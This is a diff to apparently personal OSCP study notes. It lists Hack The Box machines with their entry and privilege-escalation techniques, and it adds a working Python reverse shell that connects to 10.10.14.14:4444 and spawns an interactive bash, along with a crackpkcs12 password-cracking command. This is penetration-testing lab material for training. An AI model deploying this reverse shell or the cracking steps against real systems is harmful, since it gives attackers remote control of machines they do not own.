@@ -30,7 +30,7 @@ https://github.com/tedchen0001/OSCP-Notes/blob/master/AD.md
 | *Luanne | nmap Supervisor & robots.txt weather | BSD doas & netpgp backup file |
 | Magic | [SQLi](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/) bypassing login & <br> File upload bypass [PHP getimagesize()](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass) | mysqldump & Unknown SUID binary sysinfo |
 | *Mango |  certificate subdomains & <br> [enumerate](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration) credentials of nosql-injection <br> (*Not sure if you can use this script in the exam), reuse | jjs, write root SSH public key | 
-| Meta | subdomain, Exiftool, uploads ||
+| Meta | subdomain, Exiftool, python3 reverse ||
 | Mirai | nmap, pi.hole, ssh | sudo list, mount, strings |
 | Networked | File upload bypass [PHP getimagesize()](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass), <br> php command injection | *sudo list |
 | Nibbles | page source, directory | sudo list |
@@ -605,4 +605,20 @@ Used in `Search`
 
 ```
 crackpkcs12 -d ~/Documents/rockyou.txt staff.pfx
+```
+
+Used in `Meta`
+
+```python3
+#!/usr/bin/python3
+from os import dup2
+from subprocess import run
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.10.14.14", 4444))
+dup2(s.fileno(), 0)
+dup2(s.fileno(), 1)
+dup2(s.fileno(), 2)
+run(["/bin/bash", "-i"])
 ```
